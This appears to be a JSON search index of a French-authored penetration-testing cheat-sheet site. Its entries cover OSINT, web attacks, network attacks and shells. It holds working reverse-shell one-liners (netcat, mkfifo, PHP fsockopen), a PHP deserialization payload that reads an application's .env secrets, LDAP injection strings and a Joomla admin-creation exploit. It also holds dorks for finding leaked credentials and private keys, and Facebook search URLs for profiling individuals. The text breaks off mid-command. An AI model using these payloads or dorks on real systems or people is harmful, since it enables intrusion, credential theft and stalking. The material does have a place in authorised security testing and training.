www.facebook.com/search/str/patrick/users-named/str/toulouse/pages-named/residents/present/str/paris/pages-named/residents/past/intersect/ # People who live in Paris and who like the page \u0026#34;afis sciences et pseudo sciences\u0026#34; www.facebook.com/search/str/afis%20-%20science%20et%20pseudo-sciences/pages-named/likers/str/paris/pages-named/residents/present/intersect/ # Photos containing the keyword \u0026#34;humour\u0026#34; www.facebook.com/search/str/humour/photos-keyword/ # People \u0026#34;Jeanne\u0026#34; friends of people \u0026#34;Louise\u0026#34; www.facebook.com/search/str/jeanne/users-named/friends/str/louise/users-named/intersect/ # People who live in Geneva, who like Patrick Bruel\u0026#39;s page and Céline Dion\u0026#39;s page www.facebook.com/search/str/geneva/pages-named/residents/present/str/c%C3%A9line%20dion/pages-named/likers/str/patrick%20bruel/pages-named/likers/intersect/ # Searching the keyword \u0026#34;scientifique\u0026#34; posted last month /www.facebook.com/search/str/scientifique/stories-keyword/last-month/date/stories/intersect/ # Searching someone in Ile de France / France who posted the keyword \u0026#34;scientifique\u0026#34; last month www.facebook.com/search/str/ile-de-france/pages-named/residents/present/stories/str/scientifique/stories-keyword/stories/intersect/ www.facebook.com/search/str/105604449474183/pages-named/residents/present/stories/str/scientifique/stories-keyword/stories/intersect/ # Searching posts containing \u0026#34;foutaises\u0026#34; or \u0026#34;conneries\u0026#34; www.facebook.com/search/str/foutaises/stories-keyword/str/conneries/stories-keyword/union/ # Photos posted by French people www.facebook.com/search/str/105604449474183/residents/present/photos/ # People under 29 who live in Toulouse www.facebook.com/search/str/toulouse/pages-named/residents/present/29/users-older/intersect/"
},
{
	"uri": "/web-attacks/files-inclusions-and-injections/",
	"title": "File Inclusion and Injections",
	"tags": [],
	"description": "",
	"content": " Table of Content  Server Side Injections Client Side Injections File Inclusions and Injections PHP Vulnerabilities Content Management Systems (CMS) Headers Injections MISC \u0026amp; Others  "
},
{
	"uri": "/open-source-intelligence-osint/hosting-and-repositories/",
	"title": "Hosting &amp; Repositories",
	"tags": [],
	"description": "",
	"content": " Table of Content  General  Firefox Add-ons  Technical Recon  Domains \u0026amp; IP Subdomain Enumeration Web Application Firewall (WAF) Dorks Company General Informations Public Documents and Metadata Photon MISC Frameworks \u0026amp; Correlation  Hosting \u0026amp; Repositories  Github Amazon \u0026amp; Digital Ocean Buckets  Human Recon  Social Networks E-mails Password Leaks Searching Someone Skiptracer Geolocation  Buscador  "
},
{
	"uri": "/web-attacks/content-management-system-cms/joomla/",
	"title": "Joomla!",
	"tags": [],
	"description": "",
	"content": " Scanning and Enumeration # Get components running on the website joomscan --url http://10.10.10.150/ --random-agent --enumerate-components # You can also check /administrator/manifests/files/joomla.xml # If you find components, you can often access the configuration file # JCE component → /components/com_jce/jce.xml # Check for vulnerabilities affecting components # Joomlavs is also a good scanning tool https://github.com/rastating/joomlavs \nReverse Shell # You must first log as admin # Then you must activate the PHP extension in settings System → Component → Media → “php” in legal extensions and nothing in ignored extension # If it\u0026#39;s not enough and the manager is detecting malicious PHP upload, you can still edit templates # For example, the /index.php on the “protostar\u0026#34; template → Use reverse shell from pentestmonkey → http://pentestmonkey.net/tools/web-shells/php-reverse-shell # On old versions, the control panel and features are different, but you can use templates # First go into templates parameters and activate preview # Then, on one template it is possible to edit code # Then it is possible to add shell (weevely for example) \nCVE-2012-1563 # Exploit against Joomla! \u0026lt;= 2.5.2 # Admin account creation # Some online exploits exists but it possible to exploit it manually # First, fill the registration form using 2 differents passwords # Intercept the request and add the following parameter : \u0026amp;jform[groups][]=7 (jform%5Bgroups%5D%5B%5D=7) # Forward the request → Fail because of different passwords # Now just retry to fill, using 2 valid passwords, without intercept # The parameter will be cached and the account will be created as admin !"
},
{
	"uri": "/web-attacks/server-side-injections/ldap/",
	"title": "LDAP Injections",
	"tags": [],
	"description": "",
	"content": " Basic LDAP Injection # Classical request : (\u0026amp;(uid=)(userPassword=)) # So result is TRUE if uid AND userPassword are true # You can put ‘)’ in request to crash and see the request username : *)(|(uid=* password : ) → (\u0026amp;(uid=*)(|(uid=*)(userPassword=))) OR username=* password=*)(\u0026amp; → (\u0026amp;(uid=*)(userPassword=*)(\u0026amp;)) \nBlind LDAP Injection # You have to find/imagine how is the request built # test using only a char → OK → request is (mail=*[texte]*) # You can try (mail=*)(sn=*) → )(sn= → OK # Then, the password attribute (mail=*)(password=*) → OK @*)(password=x → FALSE @*)(password=d → TRUE # You can the enumerate each char"
},
{
	"uri": "/network/mac_arp/",
	"title": "MAC &amp; ARP",
	"tags": [],
	"description": "",
	"content": " MAC Filtering Ethernet sudo macchanger -a eth0 WiFi sudo airmon-ng start wlan0 $ airodump-ng –c [channel]–bssid [target router MAC Address]–i wlan0mon # Trouver des MAC whitelisted sudo airmon-ng stop wlan0mon sudo ifconfig wlan0 down sudo macchanger -m [New MAC Address] wlan0 sudo ifconfig wlan0 up \nARP Spoofing # Old technique but still usable sometimes # You can spoof ARP trafic in order to discover new machines # If you are pivoting through a machine, you may need to upload arpspoof on the target scp /usr/sbin/arpspoof user@ip:/tmp # Then, you may need to identify and upload specific librairies # WARNING : It can be dangerous for target ldd /usr/sbin/arpspoof scp \u0026lt;path\u0026gt; user@ip:/tmp export LD_PRELOAD=./libnet.so.1 # Then you can exploit on the target # Example, spoof a gateway to discover a DC arpspoof -i eth1 -t \u0026lt;victim\u0026gt; \u0026lt;impersonated machine\u0026gt; # Terminal 2 tcpdump -i eth1 -A tcp port 143 or port 25"
},
{
	"uri": "/cryptography/misc/",
	"title": "MISC",
	"tags": [],
	"description": "",
	"content": " XOR Encryption https://github.com/hellman/xortool https://github.com/tomchop/unxor \nGPG Encryption sudo gpg --decrypt /mnt/media/dir2/findme.txt.gpg"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/frameworks-correlation/omnibus/",
	"title": "Omnibus",
	"tags": [],
	"description": "",
	"content": " General Informations https://github.com/InQuest/omnibus # An Omnibus is defined as a volume containing several novels or other items previously published separately # and that is exactly what the InQuest Omnibus project intends to be for Open Source Intelligence collection, research, and artifact management. # By providing an easy to use interactive command line application, users are able to create sessions to investigate various artifacts such as # IP addresses, domain names, email addresses, usernames, file hashes, Bitcoin addresses, and more as we continue to expand. # This project has taken motivation from the greats that came before it such as SpiderFoot, Harpoon, and DataSploit # API keys /projectfolder/etc/apikeys.json # In CLI \u0026gt; cat apikeys \nVocabulary - Artifact: → An item to investigate → Artificats can be created in two ways:• Using the “new” command or by being discoverd through module execution - Session: → Cache of artifacts created after starting the Omnibus CLI → Each artifact in a session is given an ID to quickly identify and retrieve the artifact from the cache → Commands can be executed against an artifact either by providing it\u0026#39;s name or it\u0026#39;s corresponding session ID - Module: → Python script that performs some arbitirary OSINT task against an artifact \nCommands # Main commands are - session - cat - open - new - find | Command | Description | | session | Start a new session | | new \u0026lt;artifact\u0026gt; | Create a new artifact for investigation | | modules | display a list of available modules | | open \u0026lt;file path\u0026gt; | load a text file list of artifacts into Omnibus as artifacts | | ls | show all active artifacts | | rm | remove an artifact from the database | | wipe | clear the current artifact session | | cat \u0026lt;xx\u0026gt; | view beautified JSON database records | | general | overall commands such as help, histiry, quit, set, clear, banner etc. | | artifacts | display commands specific to artifacts and their management | | sessions | display helpful commands around managing sessions | | modules | show a list of all available modules | \nArtifacts # After searching and analyzing, relationships begin to form and you can pivot through connected data points. # These data points are called Artifacts within Omnibus and represent any item you wish to investigate. # One of the following type - IPv4 adress - FQDN - Email address - Bitcoin Address - File Hash (MD5, SHA1, SHA256, SHA512) - User name # Create a new artifact new \u0026lt;artifact-name\u0026gt; # Omnibus will auto detect artifact type # Store a record of the artifact within MongoDB. This record holds the artifact name, type, subtype, module results # source, notes, tags, children information (as needed) and time of creation. # Every time you run a module against a created or stored artifact, the database document will be # updated to reflect the newly discovered information. \nSessions # Sessions are temporary caches created via Redis each time you start a CLI session. # Every time you create an artifact, that artifacts name is added to the Session along with # a numeric key that makes for easy retrieval, searching, and action against the related artifact. # Example # If session is for haax.fr # You can do “virustotal 1” instead of “virustotal haax.fr” # Sessions are here for easy access to artifacts and will be cleared each time you quit the command line session. # If you wish to clear the session early, run the command \u0026#34;wipe\u0026#34; and you\u0026#39;ll get a clean slate. \nModules # Typing the module name will show you the help information # Supported modules - Blockchain.info - Censys, Clearbit, CSIRTG, Cymon - DNS resolution, DShield (SANS ISC) - Full Contact - Geolocation, Github Username Search - HackedEmails.coms, HaveIBeenPwned.com, Hurricane Electrics - IPinfo, IPvoid - Keybase username lookup, - Nmap Scanner - OTX (AlienVault) - PassiveTotal (RiskIQ), PGP Key Search - RSS reader - Shodan - ThreatCrowd, ThreatExpert, Twitter - URLVoid - VirusTotal - Whois, WhoisMind \nMachines # Machines are a simple way to run all available modules for an artifact type against a given artifact. # This is a fast way if you want to gather as much information on a target as possible using a single command. # Run and wait (some minutes) machine \u0026lt;artifact name | session id\u0026gt; # Take care, it returns a large amount of data and child artifacts"
},
{
	"uri": "/web-attacks/php-vulnerabilities/serialization/",
	"title": "PHP Serialization",
	"tags": [],
	"description": "",
	"content": " Resources https://www.owasp.org/index.php/PHP_Object_Injection \nPHP Serialisation (PHP Slim __wakeup) # Context - \\App\\Controller\\Confidential.php $systemCall = new SystemCall(\u0026#39;system(\u0026#34;ls\u0026#34;);\u0026#39;); if($rank === UserRankService::ADMIN_RANK){ $app-\u0026gt;render(\u0026#39;front/confidential.twig\u0026#39;, array(\u0026#39;admin\u0026#39; =\u0026gt; $rank, \u0026#39;systemCall\u0026#39; =\u0026gt; $systemCall)); }else { $app-\u0026gt;redirect(\u0026#39;/connexion\u0026#39;, \u0026#39;/connexion\u0026#39;, 301); }# Context - \\Slim\\Middleware\\SessionCookie.php if ($value) { try { $_SESSION = unserialize($value); } catch (\\Exception $e) { $this-\u0026gt;app-\u0026gt;getLog()-\u0026gt;error(\u0026#39;Error unserializing session cookie value! \u0026#39; . $e-\u0026gt;getMessage()); }# Context - \\App\\Service\\SystemCall.php class SystemCall { public $hook; public $result; function __construct($hook) { $this-\u0026gt;hook = $hook; } function __wakeup() { $this-\u0026gt;result = eval($this-\u0026gt;hook); } function call() { $this-\u0026gt;__wakeup(); } }# You can override the __wakeup() method by crafting your own object and then inject it to execute command # The cookie value is unserialized and then evaluated # Base cookie a:2:{s:10:\u0026#34;slim.flash\u0026#34;;a:0:{}s:11:\u0026#34;Utilisateur\u0026#34;;i:0;} # Create object to see what it looks like \u0026lt;?php class SystemCall { private $hook = \u0026#34;phpinfo();\u0026#34;; } print urlencode(serialize(new SystemCall)); ?\u0026gt; # Object you want to inject O:22:\u0026#34;App\\Service\\SystemCall\u0026#34;:2:{s:4:\u0026#34;hook\u0026#34;;s:32:\u0026#34;system(\u0026#34;cat /var/www/app/.env\u0026#34;);\u0026#34;;s:6:\u0026#34;result\u0026#34;;N;} # Final cookie (URL encode it) a:3:{s:10:\u0026#34;slim.flash\u0026#34;;a:0:{}s:3:\u0026#34;Lol\u0026#34;;O:22:\u0026#34;App\\Service\\SystemCall\u0026#34;:2:{s:4:\u0026#34;hook\u0026#34;;s:32:\u0026#34;system(\u0026#34;cat /var/www/app/.env\u0026#34;);\u0026#34;;s:6:\u0026#34;result\u0026#34;;N;}s:11:\u0026#34;Utilisateur\u0026#34;;i:0;} # You can simplify it # You only need a string to initialize the object (to name it) # The array is not necessary # As long as you don\u0026#39;t need to be admin, you can remove the user part a:1:{s:10:\u0026#34;slim.flash\u0026#34;;O:22:\u0026#34;App\\Service\\SystemCall\u0026#34;:1:{s:4:\u0026#34;hook\u0026#34;;s:32:\u0026#34;system(\u0026#34;cat /var/www/app/.env\u0026#34;);\u0026#34;;}} \nPHP Serialisation # Unserialize() is used to store every object as a string # Initial cookie unserialized \u0026#39;a:2:{s:5:\u0026#34;login\u0026#34;;s:5:\u0026#34;guest\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:64:\u0026#34;84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec\u0026#34;;}\u0026#39; # Code if ($data[\u0026#39;password\u0026#39;] == $auth[ $data[\u0026#39;login\u0026#39;] ] ) { $_SESSION[\u0026#39;login\u0026#39;] = $data[\u0026#39;login\u0026#39;]; # Payload cookie (using a boolean) \u0026#39;a:2:{s:5:\u0026#34;login\u0026#34;;s:10:\u0026#34;superadmin\u0026#34;;s:8:\u0026#34;password\u0026#34;;b:1;}\u0026#39;"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/leaks/",
	"title": "Password leaks",
	"tags": [],
	"description": "",
	"content": " PwnedOrNot https://github.com/thewhiteh4t/pwnedOrNot.git # Simple python tool used to check haveIbeenpwned leaks for an e-mail or a list # The tool will then check if the dump is accessible (using haveibeenpwned/pastebin) to get passwords python pwnedornot.py -h python pwnedornot.py -e email@test.com python pwnedornot.py -f file.txt Pwndb.py # Tool using onion website http://pwndb2am4tzkvold.onion/ to search leaks and retrieve known passwords python pwndb.py --target email@test.fr python pwndb.py --list file python pwndb.py --target email@test.fr --ouput file \nOnline tools https://dehashed.com https://leaks.bzh https://haveibeenpwned.com \nh8mail (https://github.com/khast3x/h8mail) # Email OSINT and password finder # It uses different sources to get information (HaveIBeenPwned, Shodan, Hunter.io Public \u0026amp; Free tier, WeLeakInfo Public \u0026amp; Service, Snusbase) # NodeJS is required to bypass CloudFlare. Docker is available # Basic python h8mail.py -t target@example.com # Several target and API keys python h8mail.py -t targets.txt -c config.ini -o pwned_targets.csv # Queries through local copy of Breachcompilation and API key for Snusbase python h8mail.py -t targets.txt -bc ../Downloads/BreachCompilation/ -k \u0026#34;snusbase_url:$snusbase_url,snusbase_token:$snusbase_token\u0026#34; # No API call python h8mail.py -t targets.txt -bc ../Downloads/BreachCompilation/ --local \nLeaked 2.1 (https://github.com/GitHackTools/Leaked) # Another research tool for email and passwords # You can search for password hashes, hash leaked or email leaked # It uses python leakz module python leaked.py"
},
{
	"uri": "/linux-systems/programing-languages/perl/",
	"title": "Perl",
	"tags": [],
	"description": "",
	"content": "# Perl command injection # open() function is vulnerable and can be used to execute commands # ex : “| shutdown -r |”"
},
{
	"uri": "/linux-systems/privilege-escalation/",
	"title": "Privilege Escalation",
	"tags": [],
	"description": "",
	"content": " Table of Content  Recon and Enumeration File Transfer Privilege Escalation  System Tricks Services Abusing sudo programs  Programing Languages  Bash Python Perl   "
},
{
	"uri": "/recon-enumeration/services-enumeration/",
	"title": "Services Enumeration",
	"tags": [],
	"description": "",
	"content": " Table of Content  Application Scans Ports Scanning Services enumeration  "
},
{
	"uri": "/recon-enumeration/application-scans/vhost/",
	"title": "VHOST Scanning",
	"tags": [],
	"description": "",
	"content": " Virtual Host Scanner # Basic HTTP Scanner that\u0026#39;ll enumerate virtual hosts on a given IP # It may reveal hidden hosts # Docker ? ruby scan.rb --ip=192.168.1.101 --host=domain.tld # Options --ignore-http-codes --ignore-content-length --port --- If running on another port --wordlist --- specify an alternative location for the wordlist file --ssl --- on/off depending if you want to connect to HTTP --output --- output file"
},
{
	"uri": "/web-attacks/",
	"title": "Web vulnerabilities &amp; attacks",
	"tags": [],
	"description": "",
	"content": " Table of Content  Server Side Injections Client Side Injections File Inclusions and Injections PHP Vulnerabilities Content Management Systems (CMS) Headers Injections MISC \u0026amp; Others  "
},
{
	"uri": "/shells-methods/webshell/",
	"title": "Webshell",
	"tags": [],
	"description": "",
	"content": " Weevely # Weevely is insane ! # It\u0026#39;s like enhanced webshell which looks like a real shell # First, generate a payload shell weevely generate \u0026lt;password\u0026gt; \u0026lt;filename\u0026gt; # Then upload the file or copy the code wherever you can # Then you can just call your shell weevely \u0026lt;url\u0026gt; \u0026lt;password"
},
{
	"uri": "/recon-enumeration/services-enumeration/53_dns/",
	"title": "53 - DNS",
	"tags": [],
	"description": "",
	"content": " Zone Transfer # Port scan and trying zone transfer nmap --script=dns-transfer-zone -p 53 domain # DNS Zone Transfer using dig dig axfr @IP guess_domain_name \nActive Directory DNS # Zone Transfer using dig # Find AD-DS through DNS # Global Catalog dig -t SRV _gc._tcp.lab.ropnop.com # LDAP servers dig -t SRV _ldap._tcp.lab.ropnop.com # Kerberos KDC dig -t SRV _kerberos._tcp.lab.ropnop.com # Kerberos password change server dig -t SRV _kpasswd._tcp.lab.ropnop.com nmap --script dns-srv-enum --script-args “dns-srv-enum.domain=\u0026#39;lab.ropnop.com\u0026#39;”"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/dorks/",
	"title": "Dorks",
	"tags": [],
	"description": "",
	"content": " Google Dorks # Google Hacking made easy https://pentest-tools.com/information-gathering/google-hacking# # Search for documents on popular clouds site:drive.google.com \u0026lt;searchterm\u0026gt; site:dl.dropbox.com \u0026lt;searchterm\u0026gt; site:s3.amazonaws.com \u0026lt;searchterm\u0026gt; site:onedrive.live.com \u0026lt;searchterm\u0026gt; site:cryptome.org \u0026lt;searchterm\u0026gt; # Admins credentials intext:company_keyword \u0026amp; ext:txt | ext:sql | ext:cnf | ext:config | ext:log \u0026amp; intext:\u0026#34;admin\u0026#34; | intext:\u0026#34;root\u0026#34; | intext:\u0026#34;administrator\u0026#34; \u0026amp; intext:\u0026#34;password\u0026#34; | intext:\u0026#34;root\u0026#34; | intext:\u0026#34;admin\u0026#34; | intext:\u0026#34;administrator\u0026#34; # Look for domains indexed by others website site:bgp.he.net inurl:ndd site:dnslookup.fr inurl:ndd # Get information on the internal organization sites:cadres.apec.fr direction \u0026lt;SOCIETE\u0026gt; # Financial reports \u0026#34;périmètre de consolisation\u0026#34;|\u0026#34;rapport de référence\u0026#34;|\u0026#34;rapport annuel\u0026#34; filetype:pdf \nTwitter Dorks # Tweets containing word1 AND word2 (default operator) \u0026lt;word1\u0026gt; \u0026lt;word2\u0026gt; # Containing exact expression \u0026#34;word1\u0026#34; # Tweets containing word1 OR word 2 \u0026lt;word1\u0026gt; OR \u0026lt;word2\u0026gt; # Containing \u0026#34;cyber\u0026#34; but without \u0026#34;security\u0026#34; cyber -security # All tweets from an account or responding to an account from:\u0026lt;account\u0026gt; to:\u0026lt;account\u0026gt; # Tweets after the date or before the date \u0026lt;word\u0026gt; since:2015-02-20 \u0026lt;word\u0026gt; until:2015-02-20 # Tweets positive and negative \u0026lt;word\u0026gt; :) \u0026lt;word\u0026gt; :( # Tweets with a question \u0026lt;word\u0026gt; ? # Location (city) with a distance range near:Paris withing:25km # Tweets corresponding to \u0026#34;gaming\u0026#34; according the filter # - safe : potentially hard or deleted # - media : pictures or videos # - retweets : only retweets # - native_video : downloaded video (Amplify, Periscope, Vine) # - periscope # - vine # - images : identified as photos (also coming from Instagram) # - twimg : pic.twitter.com links # - links : links to an URL gaming filter:\u0026lt;filter\u0026gt; \nGithub Dorks # Github dorks work a lot with filename and extension # You can build search like this filename:bashrc extension:pem langage:bash # Possible to search terms and use these keywords # Some usefull examples extension:pem private # Private SSH Keys extension:sql mysql dump # MySQL dumps extension:sql mysql dump password # MySQL dumps with passwords filename:wp-config.php # Wordpress config file filename:.htpasswd # .htpasswd filename:.git-credentials # Git stored credentials filename:.bashrc password # .bashrc files containing passwords filename:.bash_profile aws # AWS keys in .bash_profiles extension:json mongolab.com # Keys/Credentials for mongolab HEROKU_API_KEY language:json # Heroku API Keys filename:filezilla.xml Pass # FTP credentials filename:recentservers.xml Pass # FTP credentials filename:config.php dbpasswd # PHP Applications databases credentials shodan_api_key language:python # Shodan API Keys (try others languages) filename:logins.json # Firefox saved password collection (key3.db usually in same repo) filename:settings.py SECRET_KEY # Django secret keys (usually allows for session hijacking, RCE, etc) \nAutomated Dorks Tools # GoogD0rker (https://github.com/ZephrFish/GoogD0rker/) ./googD0rker-txt.py -d example.com # Goohak (https://github.com/1N3/Goohak/ # Just run it on a target domain ./goohak domain.com \nPagodo # Tool to gather dorks information and find potential vulnerable web pages # The first part is the scrapper which will get dorks and save them python3 ghdb_scraper.py -j -s # And then the tool to leverage data and try to find vulnerable pages # -d option can be used to target a domain python3 pagodo.py -d example.com -g dorks.txt -l 50 -s -e 35.0 -j 1.1"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/",
	"title": "Human Recon",
	"tags": [],
	"description": "",
	"content": " Table of Content  General  Firefox Add-ons  Technical Recon  Domains \u0026amp; IP Subdomain Enumeration Web Application Firewall (WAF) Dorks Company General Informations Public Documents and Metadata Photon MISC Frameworks \u0026amp; Correlation  Hosting \u0026amp; Repositories  Github Amazon \u0026amp; Digital Ocean Buckets  Human Recon  Social Networks E-mails Password Leaks Searching Someone Skiptracer Geolocation  Buscador  "
},
{
	"uri": "/network/icmp/",
	"title": "ICMP Tricks",
	"tags": [],
	"description": "",
	"content": " ICMP exfiltration # Using scapy $ scapy Welcome to Scapy (2.2.0) \u0026gt;\u0026gt;\u0026gt; pkts = rdpcap(\u0026#34;ch6.pcap\u0026#34;) \u0026gt;\u0026gt;\u0026gt; payload_echo_request = [ p[ICMP].load for p in pkts if (p[ICMP].type == 8 and p[ICMP].code == 0)] \u0026gt;\u0026gt;\u0026gt; outfile = open(\u0026#39;ICMP_payload.dump\u0026#39;, \u0026#39;wt\u0026#39;) \u0026gt;\u0026gt;\u0026gt; outfile.write(\u0026#34;\u0026#34;.join(payload_echo_request)) \u0026gt;\u0026gt;\u0026gt; outfile.close()# Using Python #!/usr/bin/python from scapy.all import * import yenc pkts = rdpcap(\u0026#34;./echo_request.pcap\u0026#34;) fichier = open(\u0026#34;./donnees\u0026#34;,\u0026#34;w\u0026#34;) for i in range(0,len(pkts)): fichier.write(pkts[i].load) print yenc.decode(\u0026#34;./donnees\u0026#34;,\u0026#34;./résultat\u0026#34;) \nICMP Exfiltration 2 #!/usr/bin/env python from scapy.all import * pcap_file = \u0026#34;challenge.pcapng\u0026#34; data = rdpcap(pcap_file) output = \u0026#34;\u0026#34; for i in range(0, len(data)): if data[i].getlayer(IP).dst == \u0026#34;192.168.1.33\u0026#34;: payload = data[i].load.decode(\u0026#34;utf-8\u0026#34;) print(payload) output += payload output_file = open(\u0026#34;result.b64\u0026#34;, \u0026#34;w\u0026#34;) output_file.write(output) output_file.close()"
},
{
	"uri": "/windows-systems/exploitation/impacket/",
	"title": "Impacket",
	"tags": [],
	"description": "",
	"content": "TODO\n"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/social-networks/instagram/",
	"title": "Instagram",
	"tags": [],
	"description": "",
	"content": " Tips \u0026amp; Tricks # Webstagram allows you to browse any Instagram account https://web.stagram.com # Grampsy https://gramfly.com/ # Instagram photo and video downloader https://downloadgram.com/ # SaveIG (public profiles) https://saveig.com \nInstaloader (https://github.com/instaloader/instaloader) # Downloads public and private profiles, hashtags, user stories,feeds and saved media, # Downloads comments, geotags and captions of each post, # Automatically detects profile name changes and renames the targetdirectory accordingly, # Allows fine-grained customization of filters and where to storedownloaded media. # Download public profile informations instaloader profile \u0026lt;profile-name\u0026gt; # Download private profile informations instaloader --login=\u0026lt;username\u0026gt; profile \u0026lt;profile-name\u0026gt; \nInstaLooter (https://github.com/althonos/InstaLooter) # Another tool used to download information on public profiles # No API call # Usage instalooter --usage / instalooter --help # Download all pictures from an account instalooter user \u0026lt;username\u0026gt; # Download single post instalooter post \u0026#34;https://www.instagram.com/p/BFB6znLg5s1/\u0026#34; ~/Pictures # Download the latest 20 pictures or videos tagged with python to /tmp instalooter hashtag python /tmp -n 20 -v -c MYLOGIN"
},
{
	"uri": "/web-attacks/content-management-system-cms/magento/",
	"title": "Magento",
	"tags": [],
	"description": "",
	"content": " Getting Magento Version # Magento has 2 mains branches, Magento 1 and Magento 2# On Magento 2, you can add /magento_version targetsite.com/magento_version# On magento 1, you have another login interface at /dowloader # Versions can be displayed in the footer https://www.example.com/downloader/ https://www.example.com/magento/downloader/# You can find the version by comparing hash file signatures # between several versions and the running one. # That\u0026#39;s what magescan does. https://github.com/steverobbins/magento-version-identification-php \nMagescan # Online scanner # Usefull and complete, but online https://magescan.com/# Magescan is a complete scanner for Magento applications. # The idea behind this is to evaluate the quality and security of # a Magento site you don\u0026#39;t have access to. https://github.com/steverobbins/magescan # Scan techniques : # - all : full scan # - catalog : get catalog information # - modules : get installed modules (plugins) # - patch : get patch informations # - server : get server technology # - sitemap : get sitemap # - unreachable : check unreachable paths # - version : get magento version magescan.phar scan:\u0026lt;technique\u0026gt; store.example.com # If set, SSL certificates won\u0026#39;t be validated magescan.phar scan:\u0026lt;technique\u0026gt; store.example.com --insecure magescan.phar scan:\u0026lt;technique\u0026gt; store.example.com -k # Lists all modules searched for, not just those found magescan.phar scan:\u0026lt;technique\u0026gt; store.example.com --show-modules"
},
{
	"uri": "/network/",
	"title": "Network",
	"tags": [],
	"description": "",
	"content": " Table of Content  Pivot Techniques LDAP \u0026amp; DNS MAC \u0026amp; ARP ICMP Tricks  "
},
{
	"uri": "/web-attacks/php-vulnerabilities/type_juggling/",
	"title": "PHP Type Juggling",
	"tags": [],
	"description": "",
	"content": " Type Juggling and Loose Comparison # Type Juggling # In PHP, “==” returns true if $a equals $b AFTER transtyping \u0026#34;0000\u0026#34; == int(0) -\u0026gt; TRUE \u0026#34;0e12\u0026#34; == int(0) -\u0026gt; TRUE \u0026#34;1abc\u0026#34; == int(1) -\u0026gt; TRUE \u0026#34;0abc\u0026#34; == int(0) -\u0026gt; TRUE \u0026#34;abc\u0026#34; == int(0) -\u0026gt; TRUE # Loose Comparison # In PHP, if “==” is used, then 2 strings beginning by “0e” and filled with numbers will always be equal # It means that you can use magic hashes (0exxxx...) to break the comparison # md5(240610708) = 0e462097431906509019562988736854 # So 0e == 240610708 → true \nstrcmp() # If you provide an array to strcmp() it returns NULL # NULL == 0"
},
{
	"uri": "/web-attacks/php-vulnerabilities/",
	"title": "PHP Vulnerabilities",
	"tags": [],
	"description": "",
	"content": " Table of Content  Server Side Injections Client Side Injections File Inclusions and Injections PHP Vulnerabilities Content Management Systems (CMS) Headers Injections MISC \u0026amp; Others  "
},
{
	"uri": "/windows-systems/privilege-escalation/",
	"title": "Privilege Escalation",
	"tags": [],
	"description": "",
	"content": " Table of Content  Network and Domain Recon  Out of domain (no credentials) Domain Recon Domain Mapping  Local and Physical  Local Recon Enumeration Physical Access  Exploitation  Exploitation Tricks CrackMapExec Impacket Kerberos RDP Exploitation File Transfer  Privilege Escalation  Admin and Processes LSASS and Mimikatz Windows Defender Tricks  Post Exploitation  NTDS Database Silver and Golden Tickets DC Shadow   "
},
{
	"uri": "/linux-systems/programing-languages/",
	"title": "Programing Languages",
	"tags": [],
	"description": "",
	"content": " Table of Content  Recon and Enumeration File Transfer Privilege Escalation  System Tricks Services Abusing sudo programs  Programing Languages  Bash Python Perl   "
},
{
	"uri": "/shells-methods/reverse/",
	"title": "Reverse Shell",
	"tags": [],
	"description": "",
	"content": " Resources https://alamot.github.io/reverse_shells/ \nTable of Content  Basics / Classical Reverse shell using ngrok PHP Windows Linux AWK Python Windows WAR OpenSSL Telnet LUA Ruby Perl  \nBasics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -e /bin/bash OR /bin/sh | nc ATTACKING-IP 443 OR rm -f /tmp/x; mknod /tmp/x p \u0026amp;\u0026amp; nc \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; 0\u0026lt;/tmp/x | /bin/bash 1\u0026gt;/tmp/x rm -f /tmp/x; mknod /tmp/x p \u0026amp;\u0026amp; /bin/nc.openbsd \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; 0\u0026lt;/tmp/x | /bin/bash 1\u0026gt;/tmp/x rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; \u0026gt; /tmp/f rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|/bin/nc.openbsd \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; \u0026gt; /tmp/f OR /bin/nc.traditional \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; -e /bin/bash /bin/nc.traditional \u0026lt;IP\u0026gt; \u0026lt;PORT\u0026gt; -c /bin/bash \nReverse shell using ngrok # On attacker (term1) ngrok tcp 12345 # On attacker (term2) nc -lvp 12345 # On target, use your reverse shell payload on the ngrok tunnel target nc 0.tcp.ngrok.io \u0026lt;port\u0026gt; -e /bin/sh \nPHP Reverse Shell php -r \u0026#39;$s=fsockopen(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$s=fsockopen(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);shell_exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$s=fsockopen(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);`/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3`;\u0026#39; php -r \u0026#39;$s=fsockopen(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);system(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$s=fsockopen(\u0026#34;\u0026lt;IP\u0026gt;\u0026#34;,\u0026lt;PORT\u0026gt;);passthru(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r 